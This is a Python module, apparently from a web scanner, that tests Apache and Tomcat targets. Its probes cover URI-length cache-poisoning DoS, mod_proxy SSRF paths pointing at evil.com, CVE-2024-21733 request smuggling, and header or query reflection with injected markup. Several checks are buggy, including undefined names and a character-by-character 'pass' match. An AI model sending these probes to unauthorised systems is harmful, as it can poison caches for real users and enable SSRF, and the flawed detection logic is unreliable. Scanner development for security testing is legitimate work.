#!/usr/bin/env python3

from utils.utils import requests


def requestUriTooLongNoCacheParamTest(url: str, s: requests.Session) -> None:
    """Origin CORS DoS poisoning via URI length"""
    try:
        baseline_req = s.get(url, verify=False, timeout=10)
        base_url_length = len(url)
        max_param_length = 8190 - base_url_length - 1
        
        separator = "&" if "?" in url else "?"
        crafted_url = f"{url}{separator}{'a' * max_param_length}"
        
        headers = {'Accept-Encoding': 'identity'}
        poisoned_req = s.get(crafted_url, headers=headers, verify=False, timeout=10)
        result_req = s.get(url, headers=headers, verify=False, timeout=10)
        
        if baseline_req.status_code != result_req.status_code:
            print(f"{Colors.YELLOW}   └── RequestUriTooLong DoS detected{Colors.RESET}")
            print(f"       Status: {baseline_req.status_code} -> {result_req.status_code}")
    except Exception as e:
        logger.exception(e)



def mod_proxy_test(url: str, s: requests.Session) -> None:
    """Test for mod_proxy misconfigurations"""
    test_paths = [
        "/proxy:http://evil.com",
        "/%2Fproxy:http://evil.com",
        "/%252Fproxy:http://evil.com"
    ]
    for path in test_paths:
        try:
            test_url = f"{url}{path}"
            req = s.get(test_url, verify=False, timeout=10, allow_redirects=False)
            if req.status_code == 302 and "evil.com" in req.headers.get("Location", ""):
                print(f"{Colors.YELLOW}   └── mod_proxy SSRF possible: {path}{Colors.RESET}")
        except Exception:
            pass


def apache(url: str, s: requests.Session) -> None:
    """
    Unkeyed Query Exploitation: // | //?"><script>
        X-Forwarded-Server
        X-Real-IP
        Max-Forwards

    https://hackerone.com/reports/2327341: CVE-2024-21733 Apache Tomcat HTTP Request Smuggling (Client- Side Desync) (CWE: 444)
    """
    try:
        res_post_without_data = s.post(url, verify=False, timeout=10)
        res_post = s.post(url, data="X", verify=False, timeout=10)

        len_pwd = len(res_post_without_data.content)
        len_p = len(res_post.content)

        if (
            len_p not in range(len_pwd - 50, len_pwd + 50)
            and res_post.status_code not in [404, 200, 403]
            and res_post.status_code != res_post_without_data.status_code
            and len_p != 0
        ):
            print(
                f"   └── [ND][{res_post_without_data.status_code}][{len_pwd}b] :: [X][{res_post.status_code}][{len_p}b] | {url}"
            )
        else:
            for rp in res_post.text:
                if "pass" in rp or "PASS" in rp:
                    print(f"   └── CVE-2024-21733 seem's work on {url} :: {rp}")
                else:
                    pass
    except requests.ConnectionError:
        pass
    except requests.Timeout:
        pass
    except Exception:
        pass

    uqe_url = f'{url}/?"><u>plop123</u>'
    uqe_req = s.get(uqe_url, verify=False, timeout=6)
    if uqe_req not in [403, 401, 400, 500]:
        if "plop123" in uqe_req.text:
            # print("coucou")
            # TODO
            pass
    apache_headers = [
        {"X-Forwarded-Server": "plop123"},
        {"X-Real-IP": "plop123"},
        {"Max-Forwards": "plop123"},
    ]
    for aph in apache_headers:
        x_req = s.get(url, headers=aph, verify=False, timeout=10)
        print(
            f"   └── {aph}{'→':^3} {x_req.status_code:>3} [{len(x_req.content)} bytes]"
        )
        if "plop123" in x_req.text:
            print(f"   └── plop123 reflected in text with {aph} payload")
    requestUriTooLongNoCacheParamTest(url, s)
    mod_proxy_test(url, s)

